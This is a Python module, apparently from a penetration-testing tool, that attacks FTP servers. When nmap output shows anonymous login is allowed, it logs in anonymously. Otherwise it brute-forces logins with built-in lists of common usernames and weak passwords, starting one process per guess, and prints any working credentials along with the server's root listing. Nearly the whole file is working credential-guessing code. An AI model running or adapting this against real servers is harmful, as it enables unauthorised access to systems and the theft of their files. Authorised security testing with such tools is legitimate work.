import multiprocessing
from ftplib import FTP
from mods.mod_utils import *


# List of common FTP users
common_ftp_users = [
    'admin','user','ftp','anonymous','test','guest','root','administrator','ftpuser','superuser','demo','manager','operator','webmaster','support','sysadmin','backup','developer','office'
]


# List of common FTP passwords
common_ftp_passwords = [
    'password','123456','admin','12345','12345678','qwerty','1234567','123456789','1234','password1','abc123','letmein','password123','changeme','123123','login','welcome','test123','ftp123'
]


def ftp_connect(server, port, username, password):
    try:
        # Connect to the FTP server on the specified port
        ftp = FTP()
        ftp.connect(server, int(port))
        
        # Login with username and password
        ftp.login(user=username, passwd=password)

        # Print a message upon successful connection
        print(f'[+] FTP Credentials {username}:{password}', 'GREEN')

        # Perform operations (e.g., list directories, download/upload files) if needed
        # Example: List directories
        print('[!] Listing FTP root', 'YELLOW')
        print('')
        ftp.dir()

        # Close the FTP connection
        ftp.quit()
    except:
        return


def ftp_brute(ip, port):
    procs = []
    tested_creds = []

    for username in common_ftp_users:
        for password in get_usernames_esr(username):
            current_creds = f'{username}:{password}'
            if current_creds in tested_creds:
                continue
            tested_creds.append(current_creds)

            process = multiprocessing.Process(target=ftp_connect, args=(ip, port, username, password))
            procs.append(process)
        for password in common_ftp_passwords:
            current_creds = f'{username}:{password}'
            if current_creds in tested_creds:
                continue
            tested_creds.append(current_creds)
            
            # Start processes to execute
            process = multiprocessing.Process(target=ftp_connect, args=(ip, port, username, password))
            procs.append(process)
    procs = launch_procs(procs)


def print_this_banner(port):
    print_banner(port)  
    print('[!] FTP')
    print('''[!] If the FTP server does not lists the content, use the commands like:
    ftp:>passive
    ftp:>bin
    ftp:>ls -la''')

def handle_ftp(target, port, nmap_detail):
    print_this_banner(port)
    if ('ftp-anon' in nmap_detail):
        username = None
        if 'Logged in as ftp' in nmap_detail:
            username = 'ftp'
        printc('[+] Server have anonymous login enabled', GREEN)
        if not username:
            username = 'anonymous'
        printc(f'[+] FTP Credentials {username} : nopass', GREEN)
        if '20/tcp   closed ftp-data' in nmap_detail:
            printc('[-] Service is exposed but might be Unavailable', RED)
        ftp_connect(target, port, username, '')        
    else:        
        print('[!] Testing common credentials for FTP')
        ftp_brute(target, port)
